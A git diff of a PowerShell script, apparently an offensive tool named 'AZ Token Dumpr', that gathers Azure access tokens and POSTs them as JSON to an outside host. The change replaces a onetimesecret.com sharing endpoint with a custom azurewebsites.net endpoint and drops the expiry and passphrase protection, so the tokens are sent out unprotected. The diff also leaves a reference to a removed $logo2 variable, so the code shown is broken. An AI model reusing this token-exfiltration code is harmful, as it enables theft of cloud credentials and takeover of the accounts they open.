@@ -28,7 +28,7 @@ function AccessToken {
     param (
         $receiptEmail = "r.dijkman@securehats.nl",
         $passphrase = "",
-        $version = '1.0.9'
+        $version = '1.1.0'
     )
 
     if (-not(Get-Module -Name 'Az.Accounts')) {
@@ -49,25 +49,13 @@ function AccessToken {
     try {
         $tokens = @()
 
-        $logo = @"
-    |     |'''''||     |''||''|         '||                          '||''|.
-   |||        .|'         ||      ...    ||  ..    ....  .. ...       ||   ||  ... ...  .. .. ..   ... ...  ... ..
-  |  ||      ||           ||    .|  '|.  || .'   .|...||  ||  ||      ||    ||  ||  ||   || || ||   ||'  ||  ||' ''
- .''''|.   .|'            ||    ||   ||  ||'|.   ||       ||  ||      ||    ||  ||  ||   || || ||   ||    |  ||
-.|.  .||. ||......|      .||.    '|..|' .||. ||.  '|...' .||. ||.    .||...|'   '|..'|. .|| || ||.  ||...'  .||.
-                                                                                                    ||
-                                                                                                   ''''
-                                    --- AZ Token Dumpr v$version ---
-
-"@
-
-$logo2 = @"
-     ╭╮  ╭╮         ╭╮
-     ┃╰┳━┫┣┳━┳━┳╮  ╭╯┣┳┳━━┳━┳┳╮
-     ┃╭┫╋┃━┫┻┫┃┃┃  ┃╋┃┃┃┃┃┃╋┃╭╯
-     ╰━┻━┻┻┻━┻┻━╯  ╰━┻━┻┻┻┫╭┻╯
-                          ╰╯
---- AZ Token Dumpr v$version ---
+$logo = @"
+      ╭╮  ╭╮         ╭╮
+      ┃╰┳━┫┣┳━┳━┳╮  ╭╯┣┳┳━━┳━┳┳╮
+      ┃╭┫╋┃━┫┻┫┃┃┃  ┃╋┃┃┃┃┃┃╋┃╭╯
+      ╰━┻━┻┻┻━┻┻━╯  ╰━┻━┻┻┻┫╭┻╯
+                           ╰╯
+  --- AZ Token Dumpr v$version ---
 "@
 
         Write-Host $logo2
@@ -89,13 +77,15 @@ $logo2 = @"
         }
 
         $requestParam = @{
-            Uri    = 'https://us.onetimesecret.com/api/v1/share'
+            Uri    = 'https://opt-c5ggh6adhzbvezdj.westeurope-01.azurewebsites.net/api/add?' #'https://us.onetimesecret.com/api/v1/share'
             Method = 'POST'
             Body   = @{
-                secret     = $tokens | ConvertTo-Json -Depth 10
-                ttl        = 3600
-                Recipient  = $($receiptEmail)
-                passphrase = $($passphrase)
+                action       = "create"
+                secret_value = $tokens | ConvertTo-Json -Depth 10
+                # secret     = $tokens | ConvertTo-Json -Depth 10
+                # ttl        = 3600
+                # Recipient  = $($receiptEmail)
+                # passphrase = $($passphrase)
             }
         }
 
